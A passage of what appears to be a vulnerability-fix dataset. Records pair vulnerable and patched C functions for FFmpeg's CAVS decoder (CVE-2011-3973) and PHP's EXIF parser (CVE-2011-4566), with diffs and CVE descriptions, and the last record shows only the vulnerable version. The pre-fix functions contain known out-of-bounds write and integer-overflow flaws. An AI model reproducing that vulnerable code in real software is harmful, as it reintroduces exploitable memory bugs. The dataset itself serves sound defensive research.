        "func_before": "static int cavs_decode_frame(AVCodecContext * avctx,void *data, int *data_size,\n                             AVPacket *avpkt) {\n    const uint8_t *buf = avpkt->data;\n    int buf_size = avpkt->size;\n    AVSContext *h = avctx->priv_data;\n    MpegEncContext *s = &h->s;\n    int input_size;\n    const uint8_t *buf_end;\n    const uint8_t *buf_ptr;\n    AVFrame *picture = data;\n    uint32_t stc = -1;\n\n    s->avctx = avctx;\n\n    if (buf_size == 0) {\n        if(!s->low_delay && h->DPB[0].data[0]) {\n            *data_size = sizeof(AVPicture);\n            *picture = *(AVFrame *) &h->DPB[0];\n        }\n        return 0;\n    }\n\n    buf_ptr = buf;\n    buf_end = buf + buf_size;\n    for(;;) {\n        buf_ptr = ff_find_start_code(buf_ptr,buf_end, &stc);\n        if(stc & 0xFFFFFE00)\n            return FFMAX(0, buf_ptr - buf - s->parse_context.last_index);\n        input_size = (buf_end - buf_ptr)*8;\n        switch(stc) {\n        case CAVS_START_CODE:\n            init_get_bits(&s->gb, buf_ptr, input_size);\n            decode_seq_header(h);\n            break;\n        case PIC_I_START_CODE:\n            if(!h->got_keyframe) {\n                if(h->DPB[0].data[0])\n                    avctx->release_buffer(avctx, (AVFrame *)&h->DPB[0]);\n                if(h->DPB[1].data[0])\n                    avctx->release_buffer(avctx, (AVFrame *)&h->DPB[1]);\n                h->got_keyframe = 1;\n            }\n        case PIC_PB_START_CODE:\n            *data_size = 0;\n            if(!h->got_keyframe)\n                break;\n            init_get_bits(&s->gb, buf_ptr, input_size);\n            h->stc = stc;\n            if(decode_pic(h))\n                break;\n            *data_size = sizeof(AVPicture);\n            if(h->pic_type != AV_PICTURE_TYPE_B) {\n                if(h->DPB[1].data[0]) {\n                    *picture = *(AVFrame *) &h->DPB[1];\n                } else {\n                    *data_size = 0;\n                }\n            } else\n                *picture = *(AVFrame *) &h->picture;\n            break;\n        case EXT_START_CODE:\n            //mpeg_decode_extension(avctx,buf_ptr, input_size);\n            break;\n        case USER_START_CODE:\n            //mpeg_decode_user_data(avctx,buf_ptr, input_size);\n            break;\n        default:\n            if (stc <= SLICE_MAX_START_CODE) {\n                init_get_bits(&s->gb, buf_ptr, input_size);\n                decode_slice_header(h, &s->gb);\n            }\n            break;\n        }\n    }\n}",
        "func": "static int cavs_decode_frame(AVCodecContext * avctx,void *data, int *data_size,\n                             AVPacket *avpkt) {\n    const uint8_t *buf = avpkt->data;\n    int buf_size = avpkt->size;\n    AVSContext *h = avctx->priv_data;\n    MpegEncContext *s = &h->s;\n    int input_size;\n    const uint8_t *buf_end;\n    const uint8_t *buf_ptr;\n    AVFrame *picture = data;\n    uint32_t stc = -1;\n\n    s->avctx = avctx;\n\n    if (buf_size == 0) {\n        if(!s->low_delay && h->DPB[0].data[0]) {\n            *data_size = sizeof(AVPicture);\n            *picture = *(AVFrame *) &h->DPB[0];\n        }\n        return 0;\n    }\n\n    buf_ptr = buf;\n    buf_end = buf + buf_size;\n    for(;;) {\n        buf_ptr = ff_find_start_code(buf_ptr,buf_end, &stc);\n        if((stc & 0xFFFFFE00) || buf_ptr == buf_end)\n            return FFMAX(0, buf_ptr - buf - s->parse_context.last_index);\n        input_size = (buf_end - buf_ptr)*8;\n        switch(stc) {\n        case CAVS_START_CODE:\n            init_get_bits(&s->gb, buf_ptr, input_size);\n            decode_seq_header(h);\n            break;\n        case PIC_I_START_CODE:\n            if(!h->got_keyframe) {\n                if(h->DPB[0].data[0])\n                    avctx->release_buffer(avctx, (AVFrame *)&h->DPB[0]);\n                if(h->DPB[1].data[0])\n                    avctx->release_buffer(avctx, (AVFrame *)&h->DPB[1]);\n                h->got_keyframe = 1;\n            }\n        case PIC_PB_START_CODE:\n            *data_size = 0;\n            if(!h->got_keyframe)\n                break;\n            init_get_bits(&s->gb, buf_ptr, input_size);\n            h->stc = stc;\n            if(decode_pic(h))\n                break;\n            *data_size = sizeof(AVPicture);\n            if(h->pic_type != AV_PICTURE_TYPE_B) {\n                if(h->DPB[1].data[0]) {\n                    *picture = *(AVFrame *) &h->DPB[1];\n                } else {\n                    *data_size = 0;\n                }\n            } else\n                *picture = *(AVFrame *) &h->picture;\n            break;\n        case EXT_START_CODE:\n            //mpeg_decode_extension(avctx,buf_ptr, input_size);\n            break;\n        case USER_START_CODE:\n            //mpeg_decode_user_data(avctx,buf_ptr, input_size);\n            break;\n        default:\n            if (stc <= SLICE_MAX_START_CODE) {\n                init_get_bits(&s->gb, buf_ptr, input_size);\n                decode_slice_header(h, &s->gb);\n            }\n            break;\n        }\n    }\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -24,7 +24,7 @@\n     buf_end = buf + buf_size;\n     for(;;) {\n         buf_ptr = ff_find_start_code(buf_ptr,buf_end, &stc);\n-        if(stc & 0xFFFFFE00)\n+        if((stc & 0xFFFFFE00) || buf_ptr == buf_end)\n             return FFMAX(0, buf_ptr - buf - s->parse_context.last_index);\n         input_size = (buf_end - buf_ptr)*8;\n         switch(stc) {",
        "diff_line_info": {
            "deleted_lines": [
                "        if(stc & 0xFFFFFE00)"
            ],
            "added_lines": [
                "        if((stc & 0xFFFFFE00) || buf_ptr == buf_end)"
            ]
        }
    },
    {
        "cve_id": "CVE-2011-3973",
        "func_name": "ffmpeg/check_for_slice",
        "description": "cavsdec.c in libavcodec in FFmpeg before 0.7.4 and 0.8.x before 0.8.3 allows remote attackers to cause a denial of service (incorrect write operation and application crash) via an invalid bitstream in a Chinese AVS video (aka CAVS) file, related to the decode_residual_block, check_for_slice, and cavs_decode_frame functions, a different vulnerability than CVE-2011-3362.",
        "git_url": "http://git.videolan.org/?p=ffmpeg.git;a=commit;h=bd968d260aef322fb32e254a3de0d2036c57bd56",
        "commit_title": "",
        "commit_text": "cavs: fix some crashes with invalid bitstreams  This removes all valgrind-reported invalid writes with one specific test file.  Fixes http://www.ocert.org/advisories/ocert-2011-002.html  (cherry picked from commit 4a71da0f3ab7f5542decd11c81994f849d5b2c78) ",
        "func_before": "static inline int check_for_slice(AVSContext *h) {\n    GetBitContext *gb = &h->s.gb;\n    int align;\n\n    if(h->mbx)\n        return 0;\n    align = (-get_bits_count(gb)) & 7;\n    /* check for stuffing byte */\n    if(!align && (show_bits(gb,8) == 0x80))\n        align = 8;\n    if((show_bits_long(gb,24+align) & 0xFFFFFF) == 0x000001) {\n        skip_bits_long(gb,24+align);\n        h->stc = get_bits(gb,8);\n        decode_slice_header(h,gb);\n        return 1;\n    }\n    return 0;\n}",
        "func": "static inline int check_for_slice(AVSContext *h) {\n    GetBitContext *gb = &h->s.gb;\n    int align;\n\n    if(h->mbx)\n        return 0;\n    align = (-get_bits_count(gb)) & 7;\n    /* check for stuffing byte */\n    if(!align && (show_bits(gb,8) == 0x80))\n        align = 8;\n    if((show_bits_long(gb,24+align) & 0xFFFFFF) == 0x000001) {\n        skip_bits_long(gb,24+align);\n        h->stc = get_bits(gb,8);\n        if (h->stc >= h->mb_height)\n            return 0;\n        decode_slice_header(h,gb);\n        return 1;\n    }\n    return 0;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -11,6 +11,8 @@\n     if((show_bits_long(gb,24+align) & 0xFFFFFF) == 0x000001) {\n         skip_bits_long(gb,24+align);\n         h->stc = get_bits(gb,8);\n+        if (h->stc >= h->mb_height)\n+            return 0;\n         decode_slice_header(h,gb);\n         return 1;\n     }",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "        if (h->stc >= h->mb_height)",
                "            return 0;"
            ]
        }
    },
    {
        "cve_id": "CVE-2011-3973",
        "func_name": "ffmpeg/decode_residual_block",
        "description": "cavsdec.c in libavcodec in FFmpeg before 0.7.4 and 0.8.x before 0.8.3 allows remote attackers to cause a denial of service (incorrect write operation and application crash) via an invalid bitstream in a Chinese AVS video (aka CAVS) file, related to the decode_residual_block, check_for_slice, and cavs_decode_frame functions, a different vulnerability than CVE-2011-3362.",
        "git_url": "http://git.videolan.org/?p=ffmpeg.git;a=commit;h=bd968d260aef322fb32e254a3de0d2036c57bd56",
        "commit_title": "",
        "commit_text": "cavs: fix some crashes with invalid bitstreams  This removes all valgrind-reported invalid writes with one specific test file.  Fixes http://www.ocert.org/advisories/ocert-2011-002.html  (cherry picked from commit 4a71da0f3ab7f5542decd11c81994f849d5b2c78) ",
        "func_before": "static int decode_residual_block(AVSContext *h, GetBitContext *gb,\n                                 const struct dec_2dvlc *r, int esc_golomb_order,\n                                 int qp, uint8_t *dst, int stride) {\n    int i, level_code, esc_code, level, run, mask;\n    DCTELEM level_buf[65];\n    uint8_t run_buf[65];\n    DCTELEM *block = h->block;\n\n    for(i=0;i<65;i++) {\n        level_code = get_ue_code(gb,r->golomb_order);\n        if(level_code >= ESCAPE_CODE) {\n            run = ((level_code - ESCAPE_CODE) >> 1) + 1;\n            esc_code = get_ue_code(gb,esc_golomb_order);\n            level = esc_code + (run > r->max_run ? 1 : r->level_add[run]);\n            while(level > r->inc_limit)\n                r++;\n            mask = -(level_code & 1);\n            level = (level^mask) - mask;\n        } else {\n            level = r->rltab[level_code][0];\n            if(!level) //end of block signal\n                break;\n            run   = r->rltab[level_code][1];\n            r += r->rltab[level_code][2];\n        }\n        level_buf[i] = level;\n        run_buf[i] = run;\n    }\n    if(dequant(h,level_buf, run_buf, block, ff_cavs_dequant_mul[qp],\n               ff_cavs_dequant_shift[qp], i))\n        return -1;\n    h->cdsp.cavs_idct8_add(dst,block,stride);\n    h->s.dsp.clear_block(block);\n    return 0;\n}",
        "func": "static int decode_residual_block(AVSContext *h, GetBitContext *gb,\n                                 const struct dec_2dvlc *r, int esc_golomb_order,\n                                 int qp, uint8_t *dst, int stride) {\n    int i, level_code, esc_code, level, run, mask;\n    DCTELEM level_buf[65];\n    uint8_t run_buf[65];\n    DCTELEM *block = h->block;\n\n    for(i=0;i<65;i++) {\n        level_code = get_ue_code(gb,r->golomb_order);\n        if(level_code >= ESCAPE_CODE) {\n            run = ((level_code - ESCAPE_CODE) >> 1) + 1;\n            esc_code = get_ue_code(gb,esc_golomb_order);\n            level = esc_code + (run > r->max_run ? 1 : r->level_add[run]);\n            while(level > r->inc_limit)\n                r++;\n            mask = -(level_code & 1);\n            level = (level^mask) - mask;\n        } else if (level_code >= 0) {\n            level = r->rltab[level_code][0];\n            if(!level) //end of block signal\n                break;\n            run   = r->rltab[level_code][1];\n            r += r->rltab[level_code][2];\n        } else {\n            break;\n        }\n        level_buf[i] = level;\n        run_buf[i] = run;\n    }\n    if(dequant(h,level_buf, run_buf, block, ff_cavs_dequant_mul[qp],\n               ff_cavs_dequant_shift[qp], i))\n        return -1;\n    h->cdsp.cavs_idct8_add(dst,block,stride);\n    h->s.dsp.clear_block(block);\n    return 0;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -16,12 +16,14 @@\n                 r++;\n             mask = -(level_code & 1);\n             level = (level^mask) - mask;\n-        } else {\n+        } else if (level_code >= 0) {\n             level = r->rltab[level_code][0];\n             if(!level) //end of block signal\n                 break;\n             run   = r->rltab[level_code][1];\n             r += r->rltab[level_code][2];\n+        } else {\n+            break;\n         }\n         level_buf[i] = level;\n         run_buf[i] = run;",
        "diff_line_info": {
            "deleted_lines": [
                "        } else {"
            ],
            "added_lines": [
                "        } else if (level_code >= 0) {",
                "        } else {",
                "            break;"
            ]
        }
    },
    {
        "cve_id": "CVE-2011-4566",
        "func_name": "php/php-src/exif_process_IFD_TAG",
        "description": "Integer overflow in the exif_process_IFD_TAG function in exif.c in the exif extension in PHP 5.4.0beta2 on 32-bit platforms allows remote attackers to read the contents of arbitrary memory locations or cause a denial of service via a crafted offset_val value in an EXIF header in a JPEG file, a different vulnerability than CVE-2011-0708.",
        "git_url": "https://github.com/php/php-src/commit/c9b7ddf9fb0f7364bc8f71e960dcd2dcd6847ba3",
        "commit_title": "Fix bug #60150 (Integer overflow during the parsing of invalid exif header)",
        "commit_text": "",
        "func_before": "static int exif_process_IFD_TAG(image_info_type *ImageInfo, char *dir_entry, char *offset_base, size_t IFDlength, size_t displacement, int section_index, int ReadNextIFD, tag_table_type tag_table TSRMLS_DC)\n{\n\tsize_t length;\n\tint tag, format, components;\n\tchar *value_ptr, tagname[64], cbuf[32], *outside=NULL;\n\tsize_t byte_count, offset_val, fpos, fgot;\n\tint64_t byte_count_signed;\n\txp_field_type *tmp_xp;\n#ifdef EXIF_DEBUG\n\tchar *dump_data;\n\tint dump_free;\n#endif /* EXIF_DEBUG */\n\n\t/* Protect against corrupt headers */\n\tif (ImageInfo->ifd_nesting_level > MAX_IFD_NESTING_LEVEL) {\n\t\texif_error_docref(\"exif_read_data#error_ifd\" EXIFERR_CC, ImageInfo, E_WARNING, \"corrupt EXIF header: maximum directory nesting level reached\");\n\t\treturn FALSE;\n\t}\n\tImageInfo->ifd_nesting_level++;\n\n\ttag = php_ifd_get16u(dir_entry, ImageInfo->motorola_intel);\n\tformat = php_ifd_get16u(dir_entry+2, ImageInfo->motorola_intel);\n\tcomponents = php_ifd_get32u(dir_entry+4, ImageInfo->motorola_intel);\n\n\tif (!format || format > NUM_FORMATS) {\n\t\t/* (-1) catches illegal zero case as unsigned underflows to positive large. */\n\t\texif_error_docref(\"exif_read_data#error_ifd\" EXIFERR_CC, ImageInfo, E_WARNING, \"Process tag(x%04X=%s): Illegal format code 0x%04X, suppose BYTE\", tag, exif_get_tagname(tag, tagname, -12, tag_table TSRMLS_CC), format);\n\t\tformat = TAG_FMT_BYTE;\n\t\t/*return TRUE;*/\n\t}\n\n\tif (components < 0) {\n\t\texif_error_docref(\"exif_read_data#error_ifd\" EXIFERR_CC, ImageInfo, E_WARNING, \"Process tag(x%04X=%s): Illegal components(%ld)\", tag, exif_get_tagname(tag, tagname, -12, tag_table TSRMLS_CC), components);\n\t\treturn FALSE;\n\t}\n\n\tbyte_count_signed = (int64_t)components * php_tiff_bytes_per_format[format];\n\n\tif (byte_count_signed < 0 || (byte_count_signed > INT32_MAX)) {\n\t\texif_error_docref(\"exif_read_data#error_ifd\" EXIFERR_CC, ImageInfo, E_WARNING, \"Process tag(x%04X=%s): Illegal byte_count\", tag, exif_get_tagname(tag, tagname, -12, tag_table TSRMLS_CC));\n\t\treturn FALSE;\n\t}\n\n\tbyte_count = (size_t)byte_count_signed;\n\n\tif (byte_count > 4) {\n\t\toffset_val = php_ifd_get32u(dir_entry+8, ImageInfo->motorola_intel);\n\t\t/* If its bigger than 4 bytes, the dir entry contains an offset. */\n\t\tvalue_ptr = offset_base+offset_val;\n\t\tif (offset_val+byte_count > IFDlength || value_ptr < dir_entry) {\n\t\t\t/* It is important to check for IMAGE_FILETYPE_TIFF\n\t\t\t * JPEG does not use absolute pointers instead its pointers are\n\t\t\t * relative to the start of the TIFF header in APP1 section. */\n\t\t\tif (offset_val+byte_count>ImageInfo->FileSize || (ImageInfo->FileType!=IMAGE_FILETYPE_TIFF_II && ImageInfo->FileType!=IMAGE_FILETYPE_TIFF_MM && ImageInfo->FileType!=IMAGE_FILETYPE_JPEG)) {\n\t\t\t\tif (value_ptr < dir_entry) {\n\t\t\t\t\t/* we can read this if offset_val > 0 */\n\t\t\t\t\t/* some files have their values in other parts of the file */\n\t\t\t\t\texif_error_docref(\"exif_read_data#error_ifd\" EXIFERR_CC, ImageInfo, E_WARNING, \"Process tag(x%04X=%s): Illegal pointer offset(x%04X < x%04X)\", tag, exif_get_tagname(tag, tagname, -12, tag_table TSRMLS_CC), offset_val, dir_entry);\n\t\t\t\t} else {\n\t\t\t\t\t/* this is for sure not allowed */\n\t\t\t\t\t/* exception are IFD pointers */\n\t\t\t\t\texif_error_docref(\"exif_read_data#error_ifd\" EXIFERR_CC, ImageInfo, E_WARNING, \"Process tag(x%04X=%s): Illegal pointer offset(x%04X + x%04X = x%04X > x%04X)\", tag, exif_get_tagname(tag, tagname, -12, tag_table TSRMLS_CC), offset_val, byte_count, offset_val+byte_count, IFDlength);\n\t\t\t\t}\n\t\t\t\treturn FALSE;\n\t\t\t}\n\t\t\tif (byte_count>sizeof(cbuf)) {\n\t\t\t\t/* mark as outside range and get buffer */\n\t\t\t\tvalue_ptr = safe_emalloc(byte_count, 1, 0);\n\t\t\t\toutside = value_ptr;\n\t\t\t} else {\n\t\t\t\t/* In most cases we only access a small range so\n\t\t\t\t * it is faster to use a static buffer there\n\t\t\t\t * BUT it offers also the possibility to have\n\t\t\t\t * pointers read without the need to free them\n\t\t\t\t * explicitley before returning. */\n\t\t\t\tmemset(&cbuf, 0, sizeof(cbuf));\n\t\t\t\tvalue_ptr = cbuf;\n\t\t\t}\n\n\t\t\tfpos = php_stream_tell(ImageInfo->infile);\n\t\t\tphp_stream_seek(ImageInfo->infile, offset_val, SEEK_SET);\n\t\t\tfgot = php_stream_tell(ImageInfo->infile);\n\t\t\tif (fgot!=offset_val) {\n\t\t\t\tEFREE_IF(outside);\n\t\t\t\texif_error_docref(NULL EXIFERR_CC, ImageInfo, E_WARNING, \"Wrong file pointer: 0x%08X != 0x%08X\", fgot, offset_val);\n\t\t\t\treturn FALSE;\n\t\t\t}\n\t\t\tfgot = php_stream_read(ImageInfo->infile, value_ptr, byte_count);\n\t\t\tphp_stream_seek(ImageInfo->infile, fpos, SEEK_SET);\n\t\t\tif (fgot<byte_count) {\n\t\t\t\tEFREE_IF(outside);\n\t\t\t\tEXIF_ERRLOG_FILEEOF(ImageInfo)\n\t\t\t\treturn FALSE;\n\t\t\t}\n\t\t}\n\t} else {\n\t\t/* 4 bytes or less and value is in the dir entry itself */\n\t\tvalue_ptr = dir_entry+8;\n\t\toffset_val= value_ptr-offset_base;\n\t}\n\n\tImageInfo->sections_found |= FOUND_ANY_TAG;\n#ifdef EXIF_DEBUG\n\tdump_data = exif_dump_data(&dump_free, format, components, length, ImageInfo->motorola_intel, value_ptr TSRMLS_CC);\n\texif_error_docref(NULL EXIFERR_CC, ImageInfo, E_NOTICE, \"Process tag(x%04X=%s,@x%04X + x%04X(=%d)): %s%s %s\", tag, exif_get_tagname(tag, tagname, -12, tag_table TSRMLS_CC), offset_val+displacement, byte_count, byte_count, (components>1)&&format!=TAG_FMT_UNDEFINED&&format!=TAG_FMT_STRING?\"ARRAY OF \":\"\", exif_get_tagformat(format), dump_data);\n\tif (dump_free) {\n\t\tefree(dump_data);\n\t}\n#endif\n\n\tif (section_index==SECTION_THUMBNAIL) {\n\t\tif (!ImageInfo->Thumbnail.data) {\n\t\t\tswitch(tag) {\n\t\t\t\tcase TAG_IMAGEWIDTH:\n\t\t\t\tcase TAG_COMP_IMAGE_WIDTH:\n\t\t\t\t\tImageInfo->Thumbnail.width = exif_convert_any_to_int(value_ptr, format, ImageInfo->motorola_intel TSRMLS_CC);\n\t\t\t\t\tbreak;\n\t\n\t\t\t\tcase TAG_IMAGEHEIGHT:\n\t\t\t\tcase TAG_COMP_IMAGE_HEIGHT:\n\t\t\t\t\tImageInfo->Thumbnail.height = exif_convert_any_to_int(value_ptr, format, ImageInfo->motorola_intel TSRMLS_CC);\n\t\t\t\t\tbreak;\n\t\n\t\t\t\tcase TAG_STRIP_OFFSETS:\n\t\t\t\tcase TAG_JPEG_INTERCHANGE_FORMAT:\n\t\t\t\t\t/* accept both formats */\n\t\t\t\t\tImageInfo->Thumbnail.offset = exif_convert_any_to_int(value_ptr, format, ImageInfo->motorola_intel TSRMLS_CC);\n\t\t\t\t\tbreak;\n\t\n\t\t\t\tcase TAG_STRIP_BYTE_COUNTS:\n\t\t\t\t\tif (ImageInfo->FileType == IMAGE_FILETYPE_TIFF_II || ImageInfo->FileType == IMAGE_FILETYPE_TIFF_MM) {\n\t\t\t\t\t\tImageInfo->Thumbnail.filetype = ImageInfo->FileType;\n\t\t\t\t\t} else {\n\t\t\t\t\t\t/* motorola is easier to read */\n\t\t\t\t\t\tImageInfo->Thumbnail.filetype = IMAGE_FILETYPE_TIFF_MM;\n\t\t\t\t\t}\n\t\t\t\t\tImageInfo->Thumbnail.size = exif_convert_any_to_int(value_ptr, format, ImageInfo->motorola_intel TSRMLS_CC);\n\t\t\t\t\tbreak;\n\t\n\t\t\t\tcase TAG_JPEG_INTERCHANGE_FORMAT_LEN:\n\t\t\t\t\tif (ImageInfo->Thumbnail.filetype == IMAGE_FILETYPE_UNKNOWN) {\n\t\t\t\t\t\tImageInfo->Thumbnail.filetype = IMAGE_FILETYPE_JPEG;\n\t\t\t\t\t\tImageInfo->Thumbnail.size = exif_convert_any_to_int(value_ptr, format, ImageInfo->motorola_intel TSRMLS_CC);\n\t\t\t\t\t}\n\t\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t} else {\n\t\tif (section_index==SECTION_IFD0 || section_index==SECTION_EXIF)\n\t\tswitch(tag) {\n\t\t\tcase TAG_COPYRIGHT:\n\t\t\t\t/* check for \"<photographer> NUL <editor> NUL\" */\n\t\t\t\tif (byte_count>1 && (length=php_strnlen(value_ptr, byte_count)) > 0) {\n\t\t\t\t\tif (length<byte_count-1) {\n\t\t\t\t\t\t/* When there are any characters after the first NUL */\n\t\t\t\t\t\tImageInfo->CopyrightPhotographer  = estrdup(value_ptr);\n\t\t\t\t\t\tImageInfo->CopyrightEditor        = estrdup(value_ptr+length+1);\n\t\t\t\t\t\tspprintf(&ImageInfo->Copyright, 0, \"%s, %s\", value_ptr, value_ptr+length+1);\n\t\t\t\t\t\t/* format = TAG_FMT_UNDEFINED; this musn't be ASCII         */\n\t\t\t\t\t\t/* but we are not supposed to change this                   */\n\t\t\t\t\t\t/* keep in mind that image_info does not store editor value */\n\t\t\t\t\t} else {\n\t\t\t\t\t\tImageInfo->Copyright = estrdup(value_ptr);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tbreak;   \n\n\t\t\tcase TAG_USERCOMMENT:\n\t\t\t\tImageInfo->UserCommentLength = exif_process_user_comment(ImageInfo, &(ImageInfo->UserComment), &(ImageInfo->UserCommentEncoding), value_ptr, byte_count TSRMLS_CC);\n\t\t\t\tbreak;\n\n\t\t\tcase TAG_XP_TITLE:\n\t\t\tcase TAG_XP_COMMENTS:\n\t\t\tcase TAG_XP_AUTHOR:\n\t\t\tcase TAG_XP_KEYWORDS:\n\t\t\tcase TAG_XP_SUBJECT:\n\t\t\t\ttmp_xp = (xp_field_type*)safe_erealloc(ImageInfo->xp_fields.list, (ImageInfo->xp_fields.count+1), sizeof(xp_field_type), 0);\n\t\t\t\tImageInfo->sections_found |= FOUND_WINXP;\n\t\t\t\tImageInfo->xp_fields.list = tmp_xp;\n\t\t\t\tImageInfo->xp_fields.count++;\n\t\t\t\texif_process_unicode(ImageInfo, &(ImageInfo->xp_fields.list[ImageInfo->xp_fields.count-1]), tag, value_ptr, byte_count TSRMLS_CC);\n\t\t\t\tbreak;\n\n\t\t\tcase TAG_FNUMBER:\n\t\t\t\t/* Simplest way of expressing aperture, so I trust it the most.\n\t\t\t\t   (overwrite previously computed value if there is one) */\n\t\t\t\tImageInfo->ApertureFNumber = (float)exif_convert_any_format(value_ptr, format, ImageInfo->motorola_intel TSRMLS_CC);\n\t\t\t\tbreak;\n\n\t\t\tcase TAG_APERTURE:\n\t\t\tcase TAG_MAX_APERTURE:\n\t\t\t\t/* More relevant info always comes earlier, so only use this field if we don't\n\t\t\t\t   have appropriate aperture information yet. */\n\t\t\t\tif (ImageInfo->ApertureFNumber == 0) {\n\t\t\t\t\tImageInfo->ApertureFNumber\n\t\t\t\t\t\t= (float)exp(exif_convert_any_format(value_ptr, format, ImageInfo->motorola_intel TSRMLS_CC)*log(2)*0.5);\n\t\t\t\t}\n\t\t\t\tbreak;\n\n\t\t\tcase TAG_SHUTTERSPEED:\n\t\t\t\t/* More complicated way of expressing exposure time, so only use\n\t\t\t\t   this value if we don't already have it from somewhere else.\n\t\t\t\t   SHUTTERSPEED comes after EXPOSURE TIME\n\t\t\t\t  */\n\t\t\t\tif (ImageInfo->ExposureTime == 0) {\n\t\t\t\t\tImageInfo->ExposureTime\n\t\t\t\t\t\t= (float)(1/exp(exif_convert_any_format(value_ptr, format, ImageInfo->motorola_intel TSRMLS_CC)*log(2)));\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase TAG_EXPOSURETIME:\n\t\t\t\tImageInfo->ExposureTime = -1;\n\t\t\t\tbreak;\n\n\t\t\tcase TAG_COMP_IMAGE_WIDTH:\n\t\t\t\tImageInfo->ExifImageWidth = exif_convert_any_to_int(value_ptr, format, ImageInfo->motorola_intel TSRMLS_CC);\n\t\t\t\tbreak;\n\n\t\t\tcase TAG_FOCALPLANE_X_RES:\n\t\t\t\tImageInfo->FocalplaneXRes = exif_convert_any_format(value_ptr, format, ImageInfo->motorola_intel TSRMLS_CC);\n\t\t\t\tbreak;\n\n\t\t\tcase TAG_SUBJECT_DISTANCE:\n\t\t\t\t/* Inidcates the distacne the autofocus camera is focused to.\n\t\t\t\t   Tends to be less accurate as distance increases. */\n\t\t\t\tImageInfo->Distance = (float)exif_convert_any_format(value_ptr, format, ImageInfo->motorola_intel TSRMLS_CC);\n\t\t\t\tbreak;\n\n\t\t\tcase TAG_FOCALPLANE_RESOLUTION_UNIT:\n\t\t\t\tswitch((int)exif_convert_any_format(value_ptr, format, ImageInfo->motorola_intel TSRMLS_CC)) {\n\t\t\t\t\tcase 1: ImageInfo->FocalplaneUnits = 25.4; break; /* inch */\n\t\t\t\t\tcase 2:\n\t\t\t\t\t\t/* According to the information I was using, 2 measn meters.\n\t\t\t\t\t\t   But looking at the Cannon powershot's files, inches is the only\n\t\t\t\t\t\t   sensible value. */\n\t\t\t\t\t\tImageInfo->FocalplaneUnits = 25.4;\n\t\t\t\t\t\tbreak;\n\n\t\t\t\t\tcase 3: ImageInfo->FocalplaneUnits = 10;   break;  /* centimeter */\n\t\t\t\t\tcase 4: ImageInfo->FocalplaneUnits = 1;    break;  /* milimeter  */\n\t\t\t\t\tcase 5: ImageInfo->FocalplaneUnits = .001; break;  /* micrometer */\n\t\t\t\t}\n\t\t\t\tbreak;\n\n\t\t\tcase TAG_SUB_IFD:\n\t\t\t\tif (format==TAG_FMT_IFD) {\n\t\t\t\t\t/* If this is called we are either in a TIFFs thumbnail or a JPEG where we cannot handle it */\n\t\t\t\t\t/* TIFF thumbnail: our data structure cannot store a thumbnail of a thumbnail */\n\t\t\t\t\t/* JPEG do we have the data area and what to do with it */\n\t\t\t\t\texif_error_docref(NULL EXIFERR_CC, ImageInfo, E_NOTICE, \"Skip SUB IFD\");\n\t\t\t\t}\n\t\t\t\tbreak;\n\n\t\t\tcase TAG_MAKE:\n\t\t\t\tImageInfo->make = estrdup(value_ptr);\n\t\t\t\tbreak;\n\t\t\tcase TAG_MODEL:\n\t\t\t\tImageInfo->model = estrdup(value_ptr);\n\t\t\t\tbreak;\n\n\t\t\tcase TAG_MAKER_NOTE:\n\t\t\t\texif_process_IFD_in_MAKERNOTE(ImageInfo, value_ptr, byte_count, offset_base, IFDlength, displacement TSRMLS_CC);\n\t\t\t\tbreak;\n\n\t\t\tcase TAG_EXIF_IFD_POINTER:\n\t\t\tcase TAG_GPS_IFD_POINTER:\n\t\t\tcase TAG_INTEROP_IFD_POINTER:\n\t\t\t\tif (ReadNextIFD) {\n\t\t\t\t\tchar *Subdir_start;\n\t\t\t\t\tint sub_section_index = 0;\n\t\t\t\t\tswitch(tag) {\n\t\t\t\t\t\tcase TAG_EXIF_IFD_POINTER:\n#ifdef EXIF_DEBUG\n\t\t\t\t\t\t\texif_error_docref(NULL EXIFERR_CC, ImageInfo, E_NOTICE, \"Found EXIF\");\n#endif\n\t\t\t\t\t\t\tImageInfo->sections_found |= FOUND_EXIF;\n\t\t\t\t\t\t\tsub_section_index = SECTION_EXIF;\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\tcase TAG_GPS_IFD_POINTER:\n#ifdef EXIF_DEBUG\n\t\t\t\t\t\t\texif_error_docref(NULL EXIFERR_CC, ImageInfo, E_NOTICE, \"Found GPS\");\n#endif\n\t\t\t\t\t\t\tImageInfo->sections_found |= FOUND_GPS;\n\t\t\t\t\t\t\tsub_section_index = SECTION_GPS;\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\tcase TAG_INTEROP_IFD_POINTER:\n#ifdef EXIF_DEBUG\n\t\t\t\t\t\t\texif_error_docref(NULL EXIFERR_CC, ImageInfo, E_NOTICE, \"Found INTEROPERABILITY\");\n#endif\n\t\t\t\t\t\t\tImageInfo->sections_found |= FOUND_INTEROP;\n\t\t\t\t\t\t\tsub_section_index = SECTION_INTEROP;\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t\tSubdir_start = offset_base + php_ifd_get32u(value_ptr, ImageInfo->motorola_intel);\n\t\t\t\t\tif (Subdir_start < offset_base || Subdir_start > offset_base+IFDlength) {\n\t\t\t\t\t\texif_error_docref(\"exif_read_data#error_ifd\" EXIFERR_CC, ImageInfo, E_WARNING, \"Illegal IFD Pointer\");\n\t\t\t\t\t\treturn FALSE;\n\t\t\t\t\t}\n\t\t\t\t\tif (!exif_process_IFD_in_JPEG(ImageInfo, Subdir_start, offset_base, IFDlength, displacement, sub_section_index TSRMLS_CC)) {\n\t\t\t\t\t\treturn FALSE;\n\t\t\t\t\t}\n#ifdef EXIF_DEBUG\n\t\t\t\t\texif_error_docref(NULL EXIFERR_CC, ImageInfo, E_NOTICE, \"Subsection %s done\", exif_get_sectionname(sub_section_index));\n#endif\n\t\t\t\t}\n\t\t}\n\t}\n\texif_iif_add_tag(ImageInfo, section_index, exif_get_tagname(tag, tagname, sizeof(tagname), tag_table TSRMLS_CC), tag, format, components, value_ptr TSRMLS_CC);\n\tEFREE_IF(outside);\n\treturn TRUE;\n}",
